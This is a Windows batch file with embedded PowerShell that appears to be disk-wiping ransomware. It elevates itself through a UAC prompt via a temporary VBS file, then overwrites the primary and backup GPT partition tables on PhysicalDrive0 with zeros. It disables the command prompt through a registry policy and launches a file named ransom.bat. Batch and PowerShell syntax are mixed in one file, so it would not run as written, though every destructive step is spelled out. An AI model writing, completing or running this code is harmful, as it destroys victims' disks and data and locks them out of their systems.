@echo off
 :: BatchGotAdmin
 :-------------------------------------
 REM  --> Check for permissions
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
 if '%errorlevel%' NEQ '0' (
     echo Requesting administrative privileges...
     goto UACPrompt
 ) else ( goto gotAdmin )

:UACPrompt
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
     echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
     exit /B

:gotAdmin
     if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
     pushd "%CD%"
     CD /D "%~dp0"
 :--------------------------------------  

try {
    $disk = Get-PhysicalDisk | Where-Object { $_.DeviceId -eq 0 }
    if (-not $disk) { throw "Disk 0 not found" }
    $diskSizeBytes = $disk.Size

    $drive = "\\.\PhysicalDrive0"
    $fs = New-Object IO.FileStream($drive, [IO.FileMode]::Open, [IO.FileAccess]::ReadWrite, [IO.FileShare]::None)

    # Primary GPT + Entries (섹터 1부터 넉넉히 20KB)
    $fs.Position = 512
    $fs.Write([byte[]](,0 * 20480), 0, 20480)

    # Backup GPT + Entries (끝 -20KB 영역)
    $backupSafeStart = $diskSizeBytes - 20480
    if ($backupSafeStart -gt 0) {
        $fs.Position = $backupSafeStart
        $fs.Write([byte[]](,0 * 20480), 0, 20480)
    }
}
catch {
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
}
finally {
    if ($fs) { $fs.Dispose() }
}
reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 1 /f
start %localappdata%\ransom.bat
